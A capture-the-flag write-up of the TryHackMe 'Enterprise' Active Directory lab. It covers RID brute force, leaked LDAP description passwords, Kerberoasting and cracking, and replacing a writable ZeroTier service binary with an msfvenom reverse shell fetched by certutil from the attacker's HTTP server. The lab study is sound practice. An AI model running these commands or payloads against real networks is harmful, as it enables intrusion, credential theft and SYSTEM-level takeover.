# THM Enterprise

> **Platform:** TryHackMe
> **OS:** Windows (Active Directory)
> **Domain:** `LAB.ENTERPRISE.THM` (child of `ENTERPRISE.THM`) — DC `LAB-DC`
> **Theme:** RID brute → LDAP description loot → Kerberoast → service-binary hijack (ZeroTier).

> ⚠️ **Note:** this box is **out of scope for OSCP** (service-exe-hijack privesc via a third-party service), but it's good AD practice.
> **Target IP:** TryHackMe VPN — `10.49.169.203` / `10.49.149.41` across the session.

## Attack Path Overview

1. **Recon** – DC with IIS (80) and an **Atlassian Bitbucket** portal (7990).
2. **RID brute (guest)** – enumerate domain users.
3. **SMB** – a `Docs` share holds password-protected files (dead end), but **LDAP description** fields leak `nik`'s password `ToastyBoi!`.
4. **Kerberoasting (as `nik`)** – the SPN account `bitbucket` (a *sensitive-account*) cracks → `littleredbucket` → foothold.
5. **Privilege escalation** – the `zerotieroneservice` binary is writable → replace with a reverse shell → SYSTEM.

## 2. RID Brute Forcing

> Works when SMB's `IPC$` is readable. NetExec asks the DC which account owns each RID (`S-1-5-21-...-<RID>`) and Windows answers with the username.

```bash
netexec smb 10.49.149.41 -u 'guest' -p '' --rid-brute | grep -i 'sidtypeuser' | awk '{print $6}' | cut -d '\' -f2 | tee userlist2.txt
```

```
Administrator
Guest
krbtgt
atlbitbucket
LAB-DC$
ENTERPRISE$
bitbucket
nik
replication
spooks
korone
banana
Cake
contractor-temp
varg
joiner
```

> AS-REP roasting the list returned nothing — no pre-auth-disabled accounts here:
> ```bash
> impacket-GetNPUsers LAB.ENTERPRISE.THM/ -dc-ip 10.49.149.41 -usersfile userlist2.txt -no-pass   # didn't work
> ```

## 3. SMB + LDAP enumeration

Shares as `guest`:

```bash
netexec smb 10.49.149.41 -u 'guest' -p '' --shares
```

```
Share           Permissions     Remark
Docs            READ            
Users           READ            Users Share. Do Not Touch! 
```

Pull the `Docs` share:

```bash
smbclient //10.49.149.41/Docs -U 'guest'
# smb: \> mget *
```

```
RSA-Secured-Credentials.xlsx
RSA-Secured-Document-PII.docx
```

> Both files are **password-protected** and won't open — a dead end here (the hint is RSA/SecurID, not needed for the path).

Instead, read LDAP **description** fields:

```bash
ldapsearch -x -H ldap://10.49.149.41:389 -b "dc=ENTERPRISE,dc=THM" | grep description
# (with creds later: netexec ldap 10.49.149.41 -u <user> -p <pass> --users)
```

A description leaks `nik`'s password:

![](Pasted%20image%2020261025193748.png)

```
nik : ToastyBoi!
```

## 4. Kerberoasting → `bitbucket`

As `nik`, request SPN tickets:

```bash
impacket-GetUserSPNs -request -dc-ip 10.49.149.41 LAB.ENTERPRISE.THM/nik
# (password: ToastyBoi!)
```

```
ServicePrincipalName  Name       MemberOf                                                     
--------------------  ---------  -----------------------------------------------------------  
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  

$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$LAB.ENTERPRISE.THM/bitbucket*$17e610a28970585c9ebe741dac4d2d94$
```

Crack:

```bash
nano hello
john --format=krb5tgs hello --wordlist=/usr/share/wordlists/rockyou.txt
```

```
littleredbucket  (?)     
1g 0:00:00:00 DONE (2026-10-25 10:15) ...
```

```
bitbucket : littleredbucket
```

## 5. Foothold — WinRM / RDP as `bitbucket`

```bash
evil-winrm -i 10.49.149.41 -u 'bitbucket' -p 'littleredbucket'
# or RDP (if WinRM fails; black screen → lower MTU to 1000):
xfreerdp /v:10.49.149.41 /u:bitbucket@LAB.ENTERPRISE.THM /p:littleredbucket /cert:ignore /dynamic-resolution
```

## 6. Privilege Escalation — ZeroTier service hijack

The third-party **`zerotieroneservice`** runs from a writable path as SYSTEM:

```
zerotieroneservice
C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe
```

Build a reverse shell and overwrite the service binary:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali IP> LPORT=4444 -f exe -o reverse.exe
rlwrap -cAr nc -lvnp 4444
python3 -m http.server 8000
```

On the target, download straight over the service exe:

```cmd
certutil -f -urlcache http://192.168.130.62:8000/reverse.exe "C:\Program Files (x86)\Zero Tier\Zero Tier One\ZeroTier One.exe"
```

Restart the service to trigger the payload (if `demand_start`, stop/start it manually; else wait for reboot):

```cmd
net stop zerotieroneservice
net start zerotieroneservice
```

A SYSTEM reverse shell lands on the listener — grab the root flag.

## Credential Summary

| Account     | Secret            | How obtained                 |
| ----------- | ----------------- | ---------------------------- |
| `nik`       | `ToastyBoi!`      | LDAP `description` field     |
| `bitbucket` | `littleredbucket` | Kerberoast + crack           |
| SYSTEM      | (service hijack)  | ZeroTier binary overwrite    |

## Lessons Learned

- **RID brute via guest/null** builds a user list when `IPC$` is readable — even without AS-REP-able accounts.
- **Password-protected office files can be a deliberate dead end**; don't tunnel-vision — check LDAP descriptions.
- **Kerberoast whatever the description creds can reach** — `nik` → `bitbucket` (a flagged *sensitive-account*, ironically Kerberoastable).
- **Writable third-party service binaries** (ZeroTier) are a classic SYSTEM privesc: overwrite + restart. (Out of OSCP scope but a good pattern.)
